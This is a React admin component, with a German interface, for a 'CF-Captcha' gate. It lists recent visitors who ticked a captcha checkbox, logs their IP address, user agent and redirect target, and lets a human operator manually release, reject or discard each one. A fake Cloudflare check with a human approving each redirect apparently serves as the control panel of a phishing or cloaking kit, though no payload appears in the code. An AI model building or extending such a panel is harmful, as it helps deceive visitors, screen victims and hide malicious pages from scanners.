import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { ShieldCheck, Check, Trash2 } from "lucide-react";
import DeviceInfo from "./DeviceInfo";
import { toast } from "sonner";

interface Row {
  id: string;
  next_url: string | null;
  client_ua: string | null;
  client_ip: string | null;
  released_at: string | null;
  rejected_at: string | null;
  slider_released_at: string | null;
  created_at: string;
}

const CaptchaGateCard = () => {
  const [rows, setRows] = useState<Row[]>([]);

  const load = async () => {
    const since = new Date(Date.now() - 1000 * 60 * 60 * 6).toISOString();
    const { data } = await (supabase as any)
      .from("captcha_requests")
      .select("*")
      .gte("created_at", since)
      .order("created_at", { ascending: false });
    setRows(data || []);
  };


  useEffect(() => {
    load();
    const ch = (supabase as any)
      .channel("captcha_requests_admin")
      .on("postgres_changes", { event: "*", schema: "public", table: "captcha_requests" }, load)
      .subscribe();
    const iv = setInterval(load, 5000);
    return () => { (supabase as any).removeChannel(ch); clearInterval(iv); };
  }, []);

  const releaseRequest = async (id: string) => {
    const now = new Date().toISOString();
    const { error } = await (supabase as any)
      .from("captcha_requests")
      .update({ released_at: now, slider_released_at: now, rejected_at: null })
      .eq("id", id);
    if (error) toast.error(error.message);
    else toast.success("Weiterleitung freigegeben");
  };

  const rejectRequest = async (id: string) => {
    const now = new Date().toISOString();
    const { error } = await (supabase as any)
      .from("captcha_requests")
      .update({ rejected_at: now, released_at: null, slider_released_at: null })
      .eq("id", id);
    if (error) toast.error(error.message);
    else toast.success("Weiterleitung abgelehnt");
  };

  const remove = async (id: string) => {
    await (supabase as any).from("captcha_requests").delete().eq("id", id);
  };

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <ShieldCheck className="h-4 w-4" /> CF-Captcha Freigaben
          {rows.filter(r => !r.released_at && !r.rejected_at).length > 0 && (
            <span className="ml-2 text-xs bg-primary text-primary-foreground rounded-full px-2 py-0.5">{rows.filter(r => !r.released_at && !r.rejected_at).length}</span>
          )}
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-3">
        {rows.length === 0 && (
          <p className="text-sm text-muted-foreground">
            Keine wartenden Kunden. Sobald ein Kunde die Captcha-Checkbox anklickt, erscheint hier eine Freigabe.
          </p>
        )}
        {rows.map(r => {
          const approved = !!r.released_at;
          const rejected = !!r.rejected_at;
          const pending = !approved && !rejected;
          return (
            <div key={r.id} className={`border rounded-md p-3 space-y-2 ${!pending ? "opacity-70 bg-muted/40" : ""}`}>
              <div className="flex items-center justify-between gap-2">
                <div className="text-xs text-muted-foreground">
                  {new Date(r.created_at).toLocaleString("de-DE", { timeZone: "Europe/Berlin" })}
                </div>
                {approved && (
                  <span className="text-[11px] font-medium bg-green-100 text-green-700 rounded-full px-2 py-0.5 flex items-center gap-1">
                    <Check className="h-3 w-3" />Weiterleitung freigegeben
                  </span>
                )}
                {rejected && (
                  <span className="text-[11px] font-medium bg-red-100 text-red-700 rounded-full px-2 py-0.5 flex items-center gap-1">
                    <span className="leading-none">✕</span>Abgelehnt
                  </span>
                )}
              </div>
              {r.next_url && (
                <div className="text-xs break-all"><span className="font-medium">Ziel:</span> {r.next_url}</div>
              )}
              <DeviceInfo ua={r.client_ua} ip={r.client_ip} seenAt={r.created_at} />
              <div className="flex flex-wrap gap-2">
                {pending && (
                  <>
                    <Button size="sm" onClick={() => releaseRequest(r.id)} className="gap-1">
                      <Check className="h-4 w-4" />Weiterleitung freigeben
                    </Button>
                    <Button size="sm" variant="destructive" onClick={() => rejectRequest(r.id)} className="gap-1">
                      <span className="leading-none">✕</span>Ablehnen
                    </Button>
                  </>
                )}
                <Button size="sm" variant="outline" onClick={() => remove(r.id)} className="gap-1">
                  <Trash2 className="h-4 w-4" />Verwerfen
                </Button>
              </div>
            </div>
          );
        })}

      </CardContent>
    </Card>

  );
};

export default CaptchaGateCard;
